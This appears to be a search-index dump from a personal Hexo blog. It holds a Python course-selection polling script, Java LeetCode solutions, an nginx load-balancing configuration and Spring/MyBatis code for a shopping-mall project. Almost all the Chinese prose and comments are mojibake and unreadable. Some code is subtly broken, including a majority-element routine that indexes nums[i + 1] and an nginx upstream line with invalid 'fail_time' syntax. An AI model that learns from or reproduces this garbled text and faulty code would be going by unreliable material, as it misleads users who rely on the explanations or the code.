choose_response = session_client.get(choose_course_url, verify = False).text # print(choose_response) return json.loads(choose_response)[&quot;code&quot;] 3.2 ç›‘æ§å®¹é‡å¹¶æŠ¢è¯¾ä¸ºäº†é˜²æ­¢ç™»å½•çš„sessionè¿‡æœŸå¯ä»¥è®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæ¯ä¸ªåäºŒå°æ—¶å¯åŠ¨ä¸€æ¬¡è¯¥è„šæœ¬ã€‚ if __name__ == &#x27;__main__&#x27;: KCDM = course_KCDM session_client = getSession() course_info = getCourseInfo(session_client = session_client, course_KCDM = KCDM) if course_info == None: print(&quot;[+] æœªæŸ¥è¯¢åˆ°è¯¾ç¨‹ä¿¡æ¯ï¼Œè¯·æ£€æŸ¥è¯¾ç¨‹ä»£ç ï¼&quot;) quit() course_KXRS = course_info[&quot;KXRS&quot;] # è¯¾ç¨‹æ€»å®¹é‡ course_DQRS = course_info[&quot;DQRS&quot;] # å½“å‰é€‰è¯¾äººæ•° while True: if course_DQRS &lt; course_KXRS: course_BJDM = course_info[&quot;BJDM&quot;] code = chooseCourse(course_BJDM) if code == 1: print(&quot;[+] é€‰è¯¾æˆåŠŸ!&quot;) print(&quot;[+] è¯¾ç¨‹ä¿¡æ¯å¦‚ä¸‹:&quot;) printCourseInfo(course_info) quit() else: print(&quot;[+] é€‰è¯¾å¤±è´¥!&quot;) else: print(&quot;[+] å½“å‰è¯¾ç¨‹å®¹é‡å·²æ»¡!&quot;) time.sleep(sleep_time) # æ¯60sæŸ¥è¯¢ä¸€æ¬¡ continue # ç›‘æ§é€‰è¯¾äººæ•°çš„å˜åŒ– course_info = getCourseInfo(session_client=session_client, course_KCDM = KCDM) course_KXRS = course_info[&quot;KXRS&quot;] # è¯¾ç¨‹æ€»å®¹é‡ course_DQRS = course_info[&quot;DQRS&quot;] # å½“å‰é€‰è¯¾äººæ•° print(&quot;[+] Finish&quot;)","tags":[]},{"title":"Daily_Algorithm","date":"2022-07-29T05:08:13.000Z","path":"2022/07/29/Daily-Algorithm/","text":"æ¯æ—¥åˆ·é¢˜leetcodeæ¯æ—¥åˆ·é¢˜ï¼Œå…ˆå®šä¸ªå°ç›®æ ‡300 é¡¹ç›®åœ°å€ é«˜çº§ç®—æ³•åˆ†æä¸è®¾è®¡è¯¾ç¨‹ä½œä¸šä½œä¸šä¸€ä¸¤æ•°ä¹‹å’Œï¼ˆåŠ›æ‰£ç¬¬1é¢˜ï¼‰ ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼çš„é‚£ ä¸¤ä¸ª æ•´æ•°ï¼Œå¹¶è¿”å›ä»–ä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚ ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œä½ ä¸èƒ½é‡å¤åˆ©ç”¨è¿™ä¸ªæ•°ç»„ä¸­åŒæ ·çš„å…ƒç´ ã€‚ ç¤ºä¾‹: ç»™å®š nums = [2, 7, 11, 15], target = 9 å› ä¸º nums[0] + nums[1] = 2 + 7 = 9 æ‰€ä»¥è¿”å› [0, 1] æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/two-sum æ€è·¯ä¸€ï¼šæš´åŠ›ï¼ŒäºŒé‡å¾ªç¯æœç´¢ç­”æ¡ˆï¼Œè‚¯å®šè¶…æ—¶ æ€è·¯äºŒï¼šä½¿ç”¨hashè¡¨ï¼Œå°†éå†è¿‡çš„æ•°æ®æ”¾å…¥hashè¡¨ä¸­ï¼Œ&lt;key , value&gt; ä¸º&lt;nums[i], i&gt;ç»“æ„ public int[] twoSum(int[] nums, int target) &#123; HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; if(map.containsKey(target - nums[i]))&#123; return new int[]&#123;map.get(target - nums[i]), i&#125;; &#125; map.put(nums[i], i); &#125; return null; &#125; æœ€å¤§å­åºå’Œï¼ˆåŠ›æ‰£53é¢˜ï¼‰ ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ï¼Œæ‰¾åˆ°ä¸€ä¸ªå…·æœ‰æœ€å¤§å’Œçš„è¿ç»­å­æ•°ç»„ï¼ˆå­æ•°ç»„æœ€å°‘åŒ…å«ä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œè¿”å›å…¶æœ€å¤§å’Œã€‚ ç¤ºä¾‹: è¾“å…¥: [-2,1,-3,4,-1,2,1,-5,4], è¾“å‡º: 6 è§£é‡Š: è¿ç»­å­æ•°ç»„ [4,-1,2,1] çš„å’Œæœ€å¤§ï¼Œä¸º 6ã€‚ æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/maximum-subarray æ€è·¯ï¼šåŠ¨æ€è§„åˆ’ åˆ›å»ºdpæ•°ç»„ï¼Œdp[i]è¡¨ç¤ºéå†åˆ°iæ—¶ï¼Œç¬¬ iä¸ªæ•°ç»“å°¾çš„ è¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œ åŠ¨æ€è½¬ç§»æ–¹ç¨‹ dp[i] = max(dp[i - 1] + nums[i], nums[i]); åˆå§‹åŒ–dp dp[0] = nums[0] éå†é¡ºåºä¸ºä»å‰å‘å public int maxSubArray(int[] nums) &#123; // int sum = nums[0]; // int[] dp = new int[nums.length]; // dp[0] = nums[0]; // for (int i = 1; i &lt; nums.length; i++) &#123; // dp[i] = Math.max(dp[i-1] + nums[i], nums[i]); // if(dp[i] &gt; sum)&#123; // sum = dp[i]; // &#125; // &#125; // return sum; // å¯ä»¥ä¸ä½¿ç”¨dpæ•°ç»„ï¼ŒèŠ‚çœç©ºé—´ int sum = nums[0]; int result = sum; for (int i = 1; i &lt; nums.length; i++) &#123; sum = Math.max(sum + nums[i], nums[i]); if(sum &gt; result)&#123; result = sum; &#125; &#125; return result; &#125; å¤šæ•°å…ƒç´ ï¼ˆåŠ›æ‰£169é¢˜ï¼‰ ç»™å®šä¸€ä¸ªå¤§å°ä¸º n çš„æ•°ç»„ï¼Œæ‰¾åˆ°å…¶ä¸­çš„å¤šæ•°å…ƒç´ ã€‚å¤šæ•°å…ƒç´ æ˜¯æŒ‡åœ¨æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°å¤§äº âŒŠ n/2 âŒ‹ çš„å…ƒç´ ã€‚ ä½ å¯ä»¥å‡è®¾æ•°ç»„æ˜¯éç©ºçš„ï¼Œå¹¶ä¸”ç»™å®šçš„æ•°ç»„æ€»æ˜¯å­˜åœ¨å¤šæ•°å…ƒç´ ã€‚ ç¤ºä¾‹ 1: è¾“å…¥: [3,2,3] è¾“å‡º: 3 ç¤ºä¾‹ 2: è¾“å…¥: [2,2,1,1,1,2,2] è¾“å‡º: 2 æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/majority-element æ€è·¯ä¸€ï¼šä½¿ç”¨hashè¡¨ï¼Œéå†æ•°ç»„å¹¶è®¡æ•°å³å¯ æ€è·¯äºŒï¼šæ’åºï¼Œé¢˜ä¸­è¯´äº†æ€»æ˜¯å­˜åœ¨å¤šæ•°å…ƒç´ ï¼Œé‚£ä¹ˆæ’åºåçš„å¼ŸâŒŠ n/2 âŒ‹å³ä¸ºæ‰€æ±‚ç­”æ¡ˆ æ€è·¯ä¸‰ï¼šä»ç¬¬ä¸€ä¸ªæ•°å¼€å§‹count=1ï¼Œé‡åˆ°ç›¸åŒçš„å°±åŠ 1ï¼Œé‡åˆ°ä¸åŒçš„å°±å‡1ï¼Œå‡åˆ°0å°±é‡æ–°æ¢ä¸ªæ•°å¼€å§‹è®¡æ•°ï¼Œæ€»èƒ½æ‰¾åˆ°æœ€å¤šçš„é‚£ä¸ª // æ€è·¯ä¸€ public int majorityElement(int[] nums) &#123; HashMap&lt;Integer, Integer&gt; count = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; count.put(nums[i], count.getOrDefault(nums[i], 0) + 1); &#125; Set&lt;Map.Entry&lt;Integer, Integer&gt;&gt; entries = count.entrySet(); for (Map.Entry&lt;Integer, Integer&gt; entry : entries) &#123; if(entry.getValue() &gt; nums.length / 2)&#123; return entry.getKey(); &#125; &#125; return -1; &#125; // æ€è·¯äºŒ public int majorityElement(int[] nums) &#123; Arrays.sort(nums); return nums[nums.length / 2]; &#125; // æ€è·¯ä¸‰ public int majorityElement(int[] nums) &#123; int res = nums[0]; int count = 1; for (int i = 1; i &lt; nums.length; i++) &#123; if(nums[i] == res)&#123; count ++; &#125;else &#123; count --; if(count == 0)&#123; res = nums[i + 1]; &#125; &#125; &#125; return res; &#125; äºŒåˆ†æŸ¥æ‰¾ï¼ˆåŠ›æ‰£704é¢˜ï¼‰ ç»™å®šä¸€ä¸ª n ä¸ªå…ƒç´ æœ‰åºçš„ï¼ˆå‡åºï¼‰æ•´å‹æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ target ï¼Œå†™ä¸€ä¸ªå‡½æ•°æœç´¢ nums ä¸­çš„ targetï¼Œå¦‚æœç›®æ ‡å€¼å­˜åœ¨è¿”å›ä¸‹æ ‡ï¼Œå¦åˆ™è¿”å› -1ã€‚ ç¤ºä¾‹ 1: è¾“å…¥: nums = [-1,0,3,5,9,12], target = 9 è¾“å‡º: 4 è§£é‡Š: 9 å‡ºç°åœ¨ nums ä¸­å¹¶ä¸”ä¸‹æ ‡ä¸º 4 ç¤ºä¾‹ 2: è¾“å…¥: nums = [-1,0,3,5,9,12], target = 2 è¾“å‡º: -1 è§£é‡Š: 2 ä¸å­˜åœ¨ nums ä¸­å› æ­¤è¿”å› -1 æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/binary-search- æ— éœ€å¤šè¨€ public int search(int[] nums, int target) &#123; if(nums == null || nums.length == 0)&#123; return -1; &#125; int left = 0; int right = nums.length - 1; int mid = left + (right - left) / 2; while (left &lt;= right)&#123; if(target &gt; nums[mid])&#123; left = mid + 1; &#125;else if(target &lt; nums[mid])&#123; right = mid -1; &#125;else &#123; return mid; &#125; mid = left + (right - left) / 2; &#125; return -1; &#125; æ•°ç»„ä¸­ç¬¬kä¸ªæœ€å¤§å…ƒç´ ï¼ˆåŠ›æ‰£215é¢˜ï¼‰ åœ¨æœªæ’åºçš„æ•°ç»„ä¸­æ‰¾åˆ°ç¬¬ k ä¸ªæœ€å¤§çš„å…ƒç´ ã€‚è¯·æ³¨æ„ï¼Œä½ éœ€è¦æ‰¾çš„æ˜¯æ•°ç»„æ’åºåçš„ç¬¬ k ä¸ªæœ€å¤§çš„å…ƒç´ ï¼Œè€Œä¸æ˜¯ç¬¬ k ä¸ªä¸åŒçš„å…ƒç´ ã€‚ ç¤ºä¾‹ 1: è¾“å…¥: [3,2,1,5,6,4] å’Œ k = 2 è¾“å‡º: 5 ç¤ºä¾‹ 2: è¾“å…¥: [3,2,3,1,2,4,5,5,6] å’Œ k = 4 è¾“å‡º: 4 è¯´æ˜:å¯ä»¥å‡è®¾ k æ€»æ˜¯æœ‰æ•ˆçš„ï¼Œä¸” 1 â‰¤ k â‰¤ æ•°ç»„çš„é•¿åº¦ æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/kth-largest-element-in-an-array æ€è·¯ä¸€ï¼šä¼˜å…ˆé˜Ÿåˆ—ï¼Œç»´æŠ¤ä¸€ä¸ªå®¹é‡ä¸ºkçš„ä¼˜å…ˆé˜Ÿåˆ—ï¼ˆæœ€å°å †ï¼‰ï¼Œå…¶é˜Ÿé¦–å…ƒç´ ä¸ºæœ€å°å€¼ï¼Œå½“éå†å®Œæ•´ä¸ªæ•°ç»„åï¼Œé˜Ÿé¦–å…ƒç´ å³ä¸ºç¬¬kå¤§çš„æ•° æ€è·¯äºŒï¼šåŸºäºå¿«é€Ÿæ’åºçš„å¿«é€Ÿé€‰æ‹©ç®—æ³• // ä¼˜å…ˆé˜Ÿåˆ— public int findKthLargest(int[] nums, int k) &#123; // ç¬¬ 1 å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - 1; // ç¬¬ 2 å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - 2; // ... // ç¬¬ k å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - k; // åˆ›å»ºä¼˜å…ˆé˜Ÿåˆ— // åˆ›å»ºä¸€ä¸ªå®¹é‡ä¸ºkçš„å°æ ¹å †ï¼Œé‚£ä¹ˆéå†æ•´ä¸ªæ•°ç»„çš„è¿‡ç¨‹ä¸­ç»´æŠ¤è¿™ä¸ªå°æ ¹å †ï¼Œé‚£ä¹ˆå…¶æ ¹å…ƒç´ å°±æ˜¯æ•°ç»„ä¸­ç¬¬kå¤§çš„æ•° PriorityQueue&lt;Integer&gt; priorityQueue = new PriorityQueue&lt;&gt;(k, Comparator.comparingInt(a -&gt; a)); for (int i = 0; i &lt; k; i++) &#123; priorityQueue.offer(nums[i]); &#125; for (int i = k; i &lt; nums.length; i++) &#123; Integer peek = priori tyQueue.peek(); if(nums[i] &gt; peek)&#123; priorityQueue.poll(); priorityQueue.offer(nums[i]); &#125; &#125; return priorityQueue.peek(); &#125; // å¿«é€Ÿé€‰æ‹© public int findKthLargest(int[] nums, int k) &#123; // ç¬¬ 1 å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - 1; // ç¬¬ 2 å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - 2; // ... // ç¬¬ k å¤§çš„æ•°ï¼Œä¸‹æ ‡æ˜¯ len - k; int len = nums.length; int target = len - k; int left = 0; int right = len - 1; while (true) &#123; int pivotIndex = partition(nums, left, right); if (pivotIndex == target) &#123; return nums[pivotIndex]; &#125; else if (pivotIndex &lt; target) &#123; left = pivotIndex + 1; &#125; else &#123; // pivotIndex &gt; target right = pivotIndex - 1; &#125; &#125; &#125; private int partition(int[] nums, int left, int right) &#123; int randomIndex = left + random.nextInt(right - left + 1); swap(nums, left, randomIndex); // all in nums[left + 1..le) &lt;= pivot; // all in nums(ge..right] &gt;= pivot; int pivot = nums[left]; int le = left + 1; int ge = right; while (true) &#123; while (le &lt;= ge &amp;&amp; nums[le] &lt; pivot) &#123; le++; &#125; while (le &lt;= ge &amp;&amp; nums[ge] &gt; pivot) &#123; ge--; &#125; if (le &gt;= ge) &#123; break; &#125; swap(nums, le, ge); le++; ge--; &#125; swap(nums, left, ge); return ge; &#125; private void swap(int[] nums, int index1, int index2) &#123; int temp = nums[index1]; nums[index1] = nums[index2]; nums[index2] = temp; &#125; æœç´¢äºŒç»´çŸ©é˜µï¼ˆåŠ›æ‰£240é¢˜ï¼‰ ç¼–å†™ä¸€ä¸ªé«˜æ•ˆçš„ç®—æ³•æ¥æœç´¢ m x n çŸ©é˜µ matrix ä¸­çš„ä¸€ä¸ªç›®æ ‡å€¼ targetã€‚è¯¥çŸ©é˜µå…·æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š æ¯è¡Œçš„å…ƒç´ ä»å·¦åˆ°å³å‡åºæ’åˆ—ã€‚ æ¯åˆ—çš„å…ƒç´ ä»ä¸Šåˆ°ä¸‹å‡åºæ’åˆ—ã€‚ ç¤ºä¾‹: ç°æœ‰çŸ©é˜µ matrix å¦‚ä¸‹ï¼š *[* [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30] ] ç»™å®š target = 5ï¼Œè¿”å› trueã€‚ ç»™å®š target = 20ï¼Œè¿”å› falseã€‚ æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/search-a-2d-matrix-ii æ€è·¯ä¸€ï¼šé¢˜ä¸­è¯´çš„å¾ˆæ¸…æ¥šæ˜¯æœ‰åºçš„çŸ©é˜µï¼Œå¯ä»¥æ¨¡ä»¿äºŒåˆ†æœç´¢è§£å†³è¯¥é¢˜ æ€è·¯äºŒï¼š // æ€è·¯ä¸€ public boolean searchMatrix(int[][] matrix, int target) &#123; for (int[] nums : matrix) &#123; if(search(nums, target))&#123; return true; &#125; &#125; return false; &#125; public boolean search(int[] nums, int target) &#123; if(nums == null || nums.length == 0)&#123; return false; &#125; int left = 0; int right = nums.length - 1; int mid = left + (right - left) / 2; while (left &lt;= right)&#123; if(target &gt; nums[mid])&#123; left = mid + 1; &#125;else if(target &lt; nums[mid])&#123; right = mid -1; &#125;else &#123; return true; &#125; mid = left + (right - left) / 2; &#125; return false; &#125; // æ€è·¯äºŒ public boolean searchMatrix(int[][] matrix, int target) &#123; // ä»çŸ©é˜µçš„å³ä¸Šè§’æœç´¢ (0, matrix[0].length) int m = matrix[0].length; int n = matrix.length; int x = 0; int y = m - 1; while (x &lt; n &amp;&amp; y &gt;= 0)&#123; if(target == matrix[x][y])&#123; return true; &#125; else if (target &lt; matrix[x][y]) &#123; y --; &#125;else &#123; x ++; &#125; &#125; return false; &#125;","tags":[{"name":"java,algorithm","slug":"java-algorithm","permalink":"https://sunzhengyu99.github.io/tags/java-algorithm/"}]},{"title":"nginx","date":"2022-07-24T08:30:05.000Z","path":"2022/07/24/nginx/","text":"Nginxè´Ÿè½½å‡è¡¡é…ç½® å°†javaé¡¹ç›®æ‰“åŒ…å¹¶å¯åŠ¨è¿™é‡Œä¸ºäº†æœ‰æ•ˆæœï¼Œæ‰“åŒ…äº†ä¸¤ä»½ï¼Œå½“è®¿é—®æ¥å£æ—¶ï¼Œæ§åˆ¶å°æ‰“å°ä¸åŒçš„æ—¥å¿— java -jar .\\api-2.0.1-8081.jar --server.port=8081 java -jar .\\api-2.0.1-8082.jar --server.port=8082 é…ç½®nginx#user nobody; worker_processes 4; #pid logs/nginx.pid; events &#123; worker_connections 40960; &#125; http &#123; include mime.types; default_type application/octet-stream; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; upstream myservice &#123; server 127.0.0.1:8081; server 127.0.0.1:8083; # server 127.0.0.1:8847; &#125; server &#123; listen 80; server_name localhost; location / &#123; proxy_pass http://myservice; &#125; &#125; #include vhosts.conf; map $time_iso8601 $logdate &#123; &#x27;~^(?&lt;ymd&gt;\\\\d&#123;4&#125;-\\\\d&#123;2&#125;-\\\\d&#123;2&#125;)&#x27; $ymd; default &#x27;date-not-found&#x27;; &#125; include vhosts/*.conf; client_max_body_size 50m; client_body_buffer_size 60k; client_body_timeout 60; client_header_buffer_size 64k; client_header_timeout 60; error_page 400 /error/400.html; error_page 403 /error/403.html; error_page 404 /error/404.html; error_page 500 /error/500.html; error_page 501 /error/501.html; error_page 502 /error/502.html; error_page 503 /error/503.html; error_page 504 /error/504.html; error_page 505 /error/505.html; error_page 506 /error/506.html; error_page 507 /error/507.html; error_page 509 /error/509.html; error_page 510 /error/510.html; keepalive_requests 100; large_client_header_buffers 4 64k; reset_timedout_connection on; send_timeout 60; sendfile_max_chunk 512k; server_names_hash_bucket_size 256; &#125; worker_rlimit_nofile 100000; ä¸»è¦é…ç½®å†…å®¹ä¸º upstream myservice &#123; server 127.0.0.1:8081; server 127.0.0.1:8083; # server 127.0.0.1:8847; &#125; server &#123; listen 80; server_name localhost; location / &#123; proxy_pass http://myservice; &#125; &#125; å¯åŠ¨nginxå³å¯ **å½“å¯åŠ¨nginæ²¡ååº”æ—¶ï¼Œå¤šåŠæ˜¯é…ç½®æ–‡ä»¶æœ‰é—®é¢˜ï¼Œå¯ä»¥ç›´æ¥æ‹·è´æ­£ç¡®çš„é…ç½®åä¿®æ”¹ Nginxè´Ÿè½½å‡è¡¡ç­–ç•¥ å‰ç«¯/ç”¨æˆ·æ‰€æœ‰å¯¹Tomcat(åº”ç”¨æœåŠ¡å™¨)çš„è¯·æ±‚éƒ½æ˜¯é€šè¿‡Nginxè½¬å‘çš„:ç”¨æˆ·è¯·æ±‚å‘é€åˆ°nginxï¼Œnginxè½¬å‘çš„å¯¹åº”çš„æœåŠ¡å™¨ï¼Œä¸€ä¸ªé›†ç¾¤ä¸­æœ‰å¤šä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ï¼Œé‚£ä¹ˆNginxæ€ä¹ˆç¡®å®šè½¬å‘åˆ°å“ªä¸ªæœåŠ¡å™¨èŠ‚ç‚¹å‘¢?Nginxæä¾›äº†å››ç§è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒé…ç½®ç¬¬ä¸‰æ–¹çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ã€‚ è½®è¯¢ æ ¹æ®ç”¨æˆ·çš„è¯·æ±‚äº¤æ›¿çš„å‘é€åˆ°æ¯ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ï¼Œæ˜¯nginxé»˜è®¤çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ upstream myservice &#123; server 127.0.0.1:8081 max_fails=3 fail_timeout 20s fail_time=100s; # å¦‚æœåœ¨20så†…å¤±è´¥äº†ä¸‰æ¬¡ åˆ™è®©è¯¥æœåŠ¡å™¨åœæ­¢100s server 127.0.0.1:8082; server 127.0.0.1:8083; server 127.0.0.1:8084 backup; # å¤‡ç”¨æœº server 127.0.0.1:8085 down; # è¯¥æœåŠ¡å™¨æ°¸è¿œéƒ½ç”¨ä¸ä¸Š &#125; max_failsè®¾ç½®åœ¨fail_timeoutå‚æ•°è®¾ç½®çš„æ—¶é—´å†…æœ€å¤§å¤±è´¥æ¬¡æ•°ï¼Œå¦‚æœåœ¨è¿™ä¸ªæ—¶é—´å†…ï¼Œæ‰€æœ‰é’ˆå¯¹è¯¥æœåŠ¡å™¨çš„è¯·æ±‚éƒ½å¤±è´¥äº†ï¼Œé‚£ä¹ˆè®¤ä¸ºè¯¥æœåŠ¡å™¨ä¼šè¢«è®¤ä¸ºæ˜¯åœæœºäº† fail_timeout ä¸max_failsç»“åˆä½¿ç”¨ fail_timeæœåŠ¡å™¨ä¼šè¢«è®¤ä¸ºåœæœºçš„æ—¶é—´é•¿åº¦,é»˜è®¤ä¸º10s backupæ ‡è®°è¯¥æœåŠ¡å™¨ä¸ºå¤‡ç”¨æœåŠ¡å™¨,å½“ä¸»æœåŠ¡å™¨åœæ­¢æ—¶ï¼Œè¯·æ±‚ä¼šè¢«å‘é€åˆ°å®ƒè¿™é‡Œ downæ ‡è®°æœåŠ¡å™¨æ°¸ä¹…åœæœºäº† æƒé‡ upstream myservice &#123; server 127.0.0.1:8081 weight=2; server 127.0.0.1:8082; server 127.0.0.1:8083; &#125; æƒé‡æ–¹å¼ï¼Œåœ¨è½®è¯¢ç­–ç•¥çš„åŸºç¡€ä¸ŠæŒ‡å®šè½®è¯¢çš„å‡ ç‡(æ ¹æ®æœåŠ¡å™¨æ€§èƒ½å’Œèµ„æºæƒ…å†µè®¾ç½®å¯¹åº”æƒé‡æ¯”) weightå‚æ•°ç”¨äºæŒ‡å®šè½®è¯¢å‡ ç‡,weightçš„é»˜è®¤å€¼ä¸º1ï¼Œweightçš„æ•°å€¼ä¸è®¿é—®æ¯”ç‡æˆæ­£æ¯” æƒé‡è¶Šé«˜åˆ†é…åˆ°éœ€è¦å¤„ç†çš„è¯·æ±‚è¶Šå¤š æ­¤ç­–ç•¥æ¯”è¾ƒé€‚åˆæœåŠ¡å™¨çš„ç¡¬ä»¶é…ç½®å·®åˆ«æ¯”è¾ƒå¤§çš„æƒ…å†µ ip_hashæŒ‡å®šè´Ÿè½½å‡è¡¡å™¨æŒ‰ç…§åŸºäºå®¢æˆ·ç«¯IPçš„åˆ†é…æ–¹å¼ï¼Œè¿™ä¸ªæ–¹æ³•ç¡®ä¿äº†ç›¸åŒçš„å®¢æˆ·ç«¯çš„è¯·æ±‚ä¸€ç›´å‘é€åˆ°ç›¸åŒçš„æœåŠ¡å™¨ï¼Œä»¥ä¿è¯sessionä¼šè¯ã€‚è¿™æ ·æ¯ä¸ªè®¿å®¢éƒ½å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è§£å†³sessionä¸èƒ½è·¨æœåŠ¡å™¨çš„é—®é¢˜ã€‚ upstream myservice &#123; ip_hash; # ä¿è¯æ¯ä¸ªç”¨æˆ·å›ºå®šè®¿é—®åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ server 127.0.0.1:8081 weight=2; server 127.0.0.1:8082; server 127.0.0.1:8083; &#125; least _connæŠŠè¯·æ±‚è½¬å‘ç»™è¿æ¥æ•°è¾ƒå°‘çš„åç«¯æœåŠ¡å™¨ã€‚è½®è¯¢ç®—æ³•æ˜¯æŠŠè¯·æ±‚å¹³å‡çš„è½¬å‘ç»™å„ä¸ªåç«¯ï¼Œä½¿å®ƒä»¬çš„è´Ÿè½½å¤§è‡´ç›¸åŒ;ä½†æ˜¯ï¼Œæœ‰äº›è¯·æ±‚å ç”¨çš„æ—¶é—´å¾ˆé•¿ï¼Œä¼šå¯¼è‡´å…¶æ‰€åœ¨çš„åç«¯è´Ÿè½½è¾ƒé«˜ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œleast _connè¿™ç§æ–¹å¼å°±å¯ä»¥è¾¾åˆ°æ›´å¥½çš„è´Ÿè½½å‡è¡¡æ•ˆæœã€‚ upstream myservice &#123; least _conn; # æŠŠè¯·æ±‚è½¬å‘åˆ°è¿æ¥æ•°è¾ƒå°‘çš„fu server 127.0.0.1:8081 weight=2; server 127.0.0.1:8082; server 127.0.0.1:8083; &#125;","tags":[{"name":"nginx","slug":"nginx","permalink":"https://sunzhengyu99.github.io/tags/nginx/"}]},{"title":"fmmall","date":"2022-07-18T09:42:34.000Z","path":"2022/07/18/fmmall/","text":"å•†åŸé¡¹ç›® é¡¹ç›®åœ°å€ï¼šhttps://github.com/sunzhengyu99/fmmall/tree/master ä½“éªŒåœ°å€ï¼šhttp://www.fmmall.top/ 1.ä¸šåŠ¡é€»è¾‘å¼€å‘1.1ç™»å½•æ³¨å†Œ1.1.1 å®Œæˆdaoæ“ä½œ åˆ›å»ºå®ä½“ç±» package com.sunzy.fmmall.entity; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import java.sql.Date; @Data @AllArgsConstructor @NoArgsConstructor public class Users &#123; private Integer userId; private String username; private String password; private String nickname; private String realname; private String userImg; private String userMobile; private String userEmail; private String userSex; private Date userBirth; private Date userRegtime; private Date userModtime; &#125; ç¼–å†™UserDaoæ–‡ä»¶ package com.sunzy.fmmall.dao; import com.sunzy.fmmall.entity.User; import com.sunzy.fmmall.entity.Users; import org.apache.ibatis.annotations.Mapper; @Mapper public interface UserDao &#123; public User queryUserByName(String name); public User insertUser(Users user); &#125; ç¼–å†™UserMapper.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt; &lt;mapper namespace=&quot;com.sunzy.fmmall.dao.UserDao&quot;&gt; &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.sunzy.fmmall.entity.Users&quot;&gt; &lt;!-- WARNING - @mbg.generated --&gt; &lt;id column=&quot;user_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;username&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;username&quot; /&gt; &lt;result column=&quot;password&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;password&quot; /&gt; &lt;result column=&quot;nickname&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;nickname&quot; /&gt; &lt;result column=&quot;realname&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;realname&quot; /&gt; &lt;result column=&quot;user_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userImg&quot; /&gt; &lt;result column=&quot;user_mobile&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userMobile&quot; /&gt; &lt;result column=&quot;user_email&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userEmail&quot; /&gt; &lt;result column=&quot;user_sex&quot; jdbcType=&quot;CHAR&quot; property=&quot;userSex&quot; /&gt; &lt;result column=&quot;user_birth&quot; jdbcType=&quot;DATE&quot; property=&quot;userBirth&quot; /&gt; &lt;result column=&quot;user_regtime&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;userRegtime&quot; /&gt; &lt;result column=&quot;user_modtime&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;userModtime&quot; /&gt; &lt;/resultMap&gt; &lt;insert id=&quot;insertUser&quot;&gt; insert into users(username, password, user_img, user_regtime, user_modtime) values(#&#123;username&#125;, #&#123;password&#125;,#&#123;userImg&#125;, #&#123;userRegtime&#125;,#&#123;userModtime&#125;) &lt;/insert&gt; &lt;select id=&quot;queryUserByName&quot; resultMap=&quot;BaseResultMap&quot;&gt; select user_id, username, password, nickname, realname, user_img, user_mobile, user_email, user_sex, user_birth, user_regtime, user_modtime from users where username = #&#123;name&#125; &lt;/select&gt; 